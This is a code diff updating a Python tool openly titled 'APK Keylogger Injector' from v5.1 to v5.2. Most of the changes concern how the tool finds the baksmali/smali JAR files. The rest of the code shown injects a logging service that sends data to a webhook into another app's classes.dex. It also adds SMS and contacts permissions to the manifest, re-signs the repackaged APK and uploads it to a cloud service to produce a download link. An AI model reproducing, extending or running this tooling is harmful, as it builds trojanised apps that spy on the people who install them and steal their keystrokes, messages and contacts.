@@ -1,9 +1,9 @@
 #!/usr/bin/env python3
 """
 ====================================================================
-  APK KEYLOGGER INJECTOR v5.1 – Uses Termux baksmali/smali
-  - Uses system baksmali/smali (no downloads)
-  - Uses apktool ONLY for manifest
+  APK KEYLOGGER INJECTOR v5.2 – Uses Existing baksmali/smali JARs
+  - Uses your installed baksmali/smali JARs
+  - No auto-download, no package manager issues
   - Preserves ALL original resources
 ====================================================================
 """
@@ -18,6 +18,7 @@ import time
 import requests
 import tempfile
 from datetime import datetime
+from pathlib import Path
 
 # ---------------------------- COLORS ----------------------------
 class Colors:
@@ -34,27 +35,104 @@ class Colors:
 def print_c(msg, color=Colors.RESET):
     print(f"{color}{msg}{Colors.RESET}")
 
+# ---------------------------- FIND BAKSMALI/SMALI JARS ----------------------------
+def find_jars():
+    """Find baksmali.jar and smali.jar in common locations"""
+    jar_paths = []
+    
+    # Current directory
+    current_dir = os.getcwd()
+    jar_paths.extend([
+        os.path.join(current_dir, "baksmali-3.0.9-fat-release.jar"),
+        os.path.join(current_dir, "smali-3.0.9-fat-release.jar"),
+        os.path.join(current_dir, "baksmali.jar"),
+        os.path.join(current_dir, "smali.jar"),
+    ])
+    
+    # Home directory
+    home_dir = os.path.expanduser("~")
+    jar_paths.extend([
+        os.path.join(home_dir, "baksmali-3.0.9-fat-release.jar"),
+        os.path.join(home_dir, "smali-3.0.9-fat-release.jar"),
+        os.path.join(home_dir, "baksmali.jar"),
+        os.path.join(home_dir, "smali.jar"),
+    ])
+    
+    # Keylogger directory
+    keylogger_dir = os.path.join(home_dir, "Keylogger")
+    jar_paths.extend([
+        os.path.join(keylogger_dir, "baksmali-3.0.9-fat-release.jar"),
+        os.path.join(keylogger_dir, "smali-3.0.9-fat-release.jar"),
+        os.path.join(keylogger_dir, "baksmali.jar"),
+        os.path.join(keylogger_dir, "smali.jar"),
+    ])
+    
+    # APK-Keylogger-Injector directory
+    injector_dir = os.path.join(home_dir, "APK-Keylogger-Injector")
+    jar_paths.extend([
+        os.path.join(injector_dir, "baksmali-3.0.9-fat-release.jar"),
+        os.path.join(injector_dir, "smali-3.0.9-fat-release.jar"),
+        os.path.join(injector_dir, "baksmali.jar"),
+        os.path.join(injector_dir, "smali.jar"),
+    ])
+    
+    # Find which ones exist
+    baksmali_jar = None
+    smali_jar = None
+    
+    for path in jar_paths:
+        if "baksmali" in path and os.path.exists(path):
+            if baksmali_jar is None:
+                baksmali_jar = path
+        elif "smali" in path and os.path.exists(path):
+            if smali_jar is None:
+                smali_jar = path
+    
+    return baksmali_jar, smali_jar
+
 # ---------------------------- DEPENDENCY CHECK ----------------------------
 def check_dependencies():
     missing = []
-    tools = {
-        'java': 'pkg install openjdk-25 -y',
-        'zipalign': 'pkg install zipalign -y',
-        'apktool': 'pkg install apktool -y',
-        'aapt': 'pkg install aapt -y',
-        'baksmali': 'pkg install baksmali -y',
-        'smali': 'pkg install smali -y'
-    }
     
-    for tool, cmd in tools.items():
-        if tool in ['baksmali', 'smali']:
-            # Check if the jar exists
-            jar_path = f"/data/data/com.termux/files/usr/share/java/{tool}.jar"
-            if not os.path.exists(jar_path):
-                missing.append((tool, cmd))
+    # Check for Java
+    if shutil.which('java') is None:
+        missing.append(('java', 'pkg install openjdk-25 -y'))
+    
+    # Check for zipalign
+    if shutil.which('zipalign') is None:
+        missing.append(('zipalign', 'pkg install zipalign -y'))
+    
+    # Check for apktool
+    if shutil.which('apktool') is None:
+        missing.append(('apktool', 'pkg install apktool -y'))
+    
+    # Check for aapt
+    if shutil.which('aapt') is None:
+        print_c("[!] aapt not found. Please install: pkg install aapt -y", Colors.RED)
+        print_c("    Or install android-tools: pkg install android-tools -y", Colors.YELLOW)
+        sys.exit(1)
+    
+    # Check for baksmali/smali JARs
+    baksmali_jar, smali_jar = find_jars()
+    if baksmali_jar is None or smali_jar is None:
+        print_c("\n[!] baksmali.jar or smali.jar not found!", Colors.RED)
+        print_c("    Please make sure you have the JARs in one of these locations:", Colors.YELLOW)
+        print_c("    - Current directory: ~/Keylogger/", Colors.YELLOW)
+        print_c("    - Home directory: ~/", Colors.YELLOW)
+        print_c("    - APK-Keylogger-Injector directory: ~/APK-Keylogger-Injector/", Colors.YELLOW)
+        print_c("\n    If you have them elsewhere, enter the full path to each JAR:", Colors.YELLOW)
+        
+        baksmali_path = input("\n📁 Path to baksmali.jar: ").strip()
+        smali_path = input("📁 Path to smali.jar: ").strip()
+        
+        if os.path.exists(baksmali_path) and os.path.exists(smali_path):
+            # Save to current directory for future use
+            shutil.copy(baksmali_path, os.path.join(os.getcwd(), "baksmali.jar"))
+            shutil.copy(smali_path, os.path.join(os.getcwd(), "smali.jar"))
+            print_c("[✓] JARs copied to current directory.", Colors.GREEN)
         else:
-            if shutil.which(tool) is None:
-                missing.append((tool, cmd))
+            print_c("[!] Invalid paths provided.", Colors.RED)
+            sys.exit(1)
     
     if missing:
         print_c("\n[!] Missing tools:", Colors.RED)
@@ -78,6 +156,7 @@ def check_dependencies():
         import requests
     
     print_c("[✓] All dependencies found.", Colors.GREEN)
+    return find_jars()
 
 # ---------------------------- KEYSTORE ----------------------------
 KEYSTORE = "mykeystore.jks"
@@ -274,17 +353,15 @@ def generate_smali(webhook, features, interval):
 '''
     return outer, inner
 
-# ---------------------------- INJECT DEX USING SYSTEM BAKSMALI/SMALI ----------------------------
-def inject_dex(apk_unzip_dir, webhook, features, interval):
-    # Find classes.dex
+# ---------------------------- INJECT DEX USING JARS ----------------------------
+def inject_dex(apk_unzip_dir, webhook, features, interval, baksmali_jar, smali_jar):
     dex_path = os.path.join(apk_unzip_dir, "classes.dex")
     if not os.path.exists(dex_path):
         raise Exception("No classes.dex found in APK")
     
-    # Disassemble using system baksmali
     smali_out = os.path.join(apk_unzip_dir, "smali")
     print_c("[*] Disassembling classes.dex...", Colors.YELLOW)
-    cmd = ["baksmali", "d", dex_path, "-o", smali_out]
+    cmd = ["java", "-jar", baksmali_jar, "d", dex_path, "-o", smali_out]
     result = subprocess.run(cmd, capture_output=True, text=True)
     if result.returncode != 0:
         print_c("[!] Baksmali failed:", Colors.RED)
@@ -301,41 +378,35 @@ def inject_dex(apk_unzip_dir, webhook, features, interval):
         f.write(inner)
     print_c("[DEBUG] Smali injected.", Colors.CYAN)
     
-    # Reassemble using system smali
+    # Reassemble
     print_c("[*] Reassembling classes.dex...", Colors.YELLOW)
     new_dex = os.path.join(apk_unzip_dir, "classes.dex")
-    cmd = ["smali", "a", smali_out, "-o", new_dex]
+    cmd = ["java", "-jar", smali_jar, "a", smali_out, "-o", new_dex]
     result = subprocess.run(cmd, capture_output=True, text=True)
     if result.returncode != 0:
         print_c("[!] Smali failed:", Colors.RED)
         print_c(result.stderr, Colors.RED)
         raise Exception("Failed to reassemble DEX")
     
-    # Remove smali folder to save space
     shutil.rmtree(smali_out, ignore_errors=True)
     print_c("[✓] DEX injection complete.", Colors.GREEN)
 
-# ---------------------------- EDIT MANIFEST USING APKTOOL (MANIFEST ONLY) ----------------------------
+# ---------------------------- EDIT MANIFEST USING APKTOOL ----------------------------
 def edit_manifest_apktool(original_apk, features):
     manifest_dir = os.path.join(tempfile.mkdtemp(), "manifest")
     os.makedirs(manifest_dir, exist_ok=True)
     
     try:
-        # Decode only manifest
         print_c("[*] Decoding manifest...", Colors.YELLOW)
         cmd = [shutil.which('apktool'), "d", "-m", original_apk, "-o", manifest_dir, "-f"]
         result = subprocess.run(cmd, capture_output=True, text=True)
         if result.returncode != 0:
-            print_c("[!] Apktool decode failed:", Colors.RED)
-            print_c(result.stderr, Colors.RED)
             raise Exception("Failed to decode manifest")
         
-        # Edit manifest
         manifest_path = os.path.join(manifest_dir, "AndroidManifest.xml")
         with open(manifest_path, "r", encoding='utf-8', errors='ignore') as f:
             manifest = f.read()
         
-        # Add permissions
         perms = ['android.permission.INTERNET']
         if features.get('sms'): perms.append('android.permission.READ_SMS')
         if features.get('contacts'): perms.append('android.permission.READ_CONTACTS')
@@ -347,7 +418,6 @@ def edit_manifest_apktool(original_apk, features):
             if f'<uses-permission android:name="{perm}"' not in manifest:
                 manifest = manifest.replace('</manifest>', f'    <uses-permission android:name="{perm}" />\n</manifest>')
         
-        # Add service
         service_tag = '<service android:name="com.gt.CustomLogger" android:enabled="true" android:exported="false" />'
         if service_tag not in manifest:
             manifest = manifest.replace('</application>', f'    {service_tag}\n</application>')
@@ -355,17 +425,13 @@ def edit_manifest_apktool(original_apk, features):
         with open(manifest_path, "w", encoding='utf-8') as f:
             f.write(manifest)
         
-        # Rebuild manifest only
         print_c("[*] Rebuilding manifest...", Colors.YELLOW)
         apk_out = os.path.join(manifest_dir, "manifest.apk")
         cmd = [shutil.which('apktool'), "b", manifest_dir, "-o", apk_out]
         result = subprocess.run(cmd, capture_output=True, text=True)
         if result.returncode != 0:
-            print_c("[!] Manifest rebuild failed:", Colors.RED)
-            print_c(result.stderr, Colors.RED)
             raise Exception("Failed to rebuild manifest")
         
-        # Extract the new manifest
         with zipfile.ZipFile(apk_out, 'r') as zf:
             manifest_bytes = zf.read("AndroidManifest.xml")
         
@@ -398,29 +464,25 @@ def upload_to_cloud(filepath):
     return None
 
 # ---------------------------- MAIN INJECTION ----------------------------
-def inject_apk(input_apk, output_dir, webhook, features, interval):
+def inject_apk(input_apk, output_dir, webhook, features, interval, baksmali_jar, smali_jar):
     work_dir = os.path.join(output_dir, f"work_{uuid.uuid4()}")
     os.makedirs(work_dir, exist_ok=True)
     apk_unzip_dir = os.path.join(work_dir, "apk_files")
     os.makedirs(apk_unzip_dir, exist_ok=True)
     
     try:
-        # 1. Unzip original APK
         print_c("[*] Extracting APK...", Colors.YELLOW)
         with zipfile.ZipFile(input_apk, 'r') as zf:
             zf.extractall(apk_unzip_dir)
         
-        # 2. Inject DEX
-        inject_dex(apk_unzip_dir, webhook, features, interval)
+        inject_dex(apk_unzip_dir, webhook, features, interval, baksmali_jar, smali_jar)
         
-        # 3. Edit manifest using apktool
         new_manifest = edit_manifest_apktool(input_apk, features)
         manifest_path = os.path.join(apk_unzip_dir, "AndroidManifest.xml")
         with open(manifest_path, 'wb') as f:
             f.write(new_manifest)
         print_c("[✓] Manifest updated.", Colors.GREEN)
         
-        # 4. Repack APK
         print_c("[*] Repacking APK...", Colors.YELLOW)
         apk_unsigned = os.path.join(work_dir, "app-unsigned.apk")
         with zipfile.ZipFile(apk_unsigned, 'w', zipfile.ZIP_DEFLATED) as zf:
@@ -430,7 +492,6 @@ def inject_apk(input_apk, output_dir, webhook, features, interval):
                     arcname = os.path.relpath(file_path, apk_unzip_dir)
                     zf.write(file_path, arcname)
         
-        # 5. Sign
         print_c("[*] Signing APK...", Colors.YELLOW)
         apk_signed = os.path.join(work_dir, "app-signed.apk")
         sign_cmd = [
@@ -444,7 +505,6 @@ def inject_apk(input_apk, output_dir, webhook, features, interval):
             print_c(result.stderr, Colors.RED)
             raise Exception("APK signing failed.")
         
-        # 6. Align
         print_c("[*] Aligning APK...", Colors.YELLOW)
         apk_final = os.path.join(work_dir, "app-final.apk")
         align_cmd = [shutil.which('zipalign'), "-v", "-p", "4", apk_unsigned, apk_final]
@@ -454,7 +514,6 @@ def inject_apk(input_apk, output_dir, webhook, features, interval):
             print_c(result.stderr, Colors.RED)
             raise Exception("APK alignment failed.")
         
-        # 7. Copy to output
         output_apk = os.path.join(output_dir, f"injected_{os.path.basename(input_apk)}")
         shutil.copy(apk_final, output_apk)
         shutil.rmtree(work_dir, ignore_errors=True)
@@ -497,9 +556,8 @@ def clear_screen():
 def show_banner():
     print_c("""
     ╔═══════════════════════════════════════════╗
-    ║   APK KEYLOGGER INJECTOR v5.1            ║
-    ║   Uses system baksmali/smali             ║
-    ║   Works on Android 17+ (and below)       ║
+    ║   APK KEYLOGGER INJECTOR v5.2            ║
+    ║   Uses your existing baksmali/smali JARs ║
     ╚═══════════════════════════════════════════╝
     """, Colors.CYAN)
 
@@ -554,14 +612,23 @@ def inject_flow():
     output_dir = os.path.join(os.getcwd(), "injected_apks")
     os.makedirs(output_dir, exist_ok=True)
     
+    # Get JAR paths
+    baksmali_jar, smali_jar = find_jars()
+    if baksmali_jar is None or smali_jar is None:
+        print_c("[!] baksmali/smali JARs not found!", Colors.RED)
+        input("\n[Press Enter to go back]")
+        return
+    
+    print_c(f"[*] Using baksmali: {baksmali_jar}", Colors.CYAN)
+    print_c(f"[*] Using smali: {smali_jar}", Colors.CYAN)
+    
     try:
         print_c("\n[*] Injection started. This may take 2-5 minutes...", Colors.YELLOW)
         start = time.time()
-        output_apk = inject_apk(apk_path, output_dir, webhook, features, interval)
+        output_apk = inject_apk(apk_path, output_dir, webhook, features, interval, baksmali_jar, smali_jar)
         elapsed = time.time() - start
         print_c(f"[✓] Injection completed in {elapsed:.1f}s", Colors.GREEN)
         
-        # Copy to /sdcard/Download/
         sdcard_download = "/sdcard/Download"
         if os.path.exists(sdcard_download):
             sdcard_apk = os.path.join(sdcard_download, os.path.basename(output_apk))
@@ -572,7 +639,6 @@ def inject_flow():
             print_c("\n[!] /sdcard/Download not found. APK is saved in:", Colors.YELLOW)
             print_c(f"   {output_apk}", Colors.YELLOW)
         
-        # Upload to cloud
         link = upload_to_cloud(output_apk)
         if link:
             print_c("\n✅ DOWNLOAD LINK:", Colors.GREEN)
@@ -591,7 +657,7 @@ def about():
     clear_screen()
     show_banner()
     print_c("\n--- ABOUT ---", Colors.BLUE)
-    print_c("APK Keylogger Injector v5.1")
+    print_c("APK Keylogger Injector v5.2")
     print_c("\nHow it works:")
     print_c("  1. Injects smali code directly into classes.dex")
     print_c("  2. Edits AndroidManifest.xml using apktool (manifest only)")
@@ -607,6 +673,16 @@ def about():
 
 # ---------------------------- MAIN ----------------------------
 if __name__ == "__main__":
+    # Check for JARs first
+    baksmali_jar, smali_jar = find_jars()
+    if baksmali_jar and smali_jar:
+        print_c(f"[✓] Found baksmali: {baksmali_jar}", Colors.GREEN)
+        print_c(f"[✓] Found smali: {smali_jar}", Colors.GREEN)
+    else:
+        print_c("[!] baksmali/smali JARs not found!", Colors.RED)
+        print_c("    The script will look for them in your current directory, home, or APK-Keylogger-Injector folder.", Colors.YELLOW)
+        print_c("    If you have them elsewhere, you'll be prompted to enter the path.", Colors.YELLOW)
+    
     check_dependencies()
     generate_keystore()
     import requests
